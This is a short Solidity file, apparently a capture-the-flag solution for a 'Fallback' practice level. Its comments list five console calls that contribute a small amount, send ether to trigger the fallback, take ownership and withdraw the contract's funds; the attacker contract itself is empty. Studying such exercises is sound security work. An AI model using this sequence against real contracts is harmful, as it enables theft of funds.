// 1 - await contract.contribute({value:toWei(0.0001)}) - Chrome Console
// 2 - await contract.getContribution().then(x => x.toNumber()) - Chrome Console
// 3 - await contract.send(1) - Chrome Console
// 4 - await contract.owner() - Chrome Console
// 5 - await contract.withdraw() - Chrome Console

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract FallbackAttacker {}
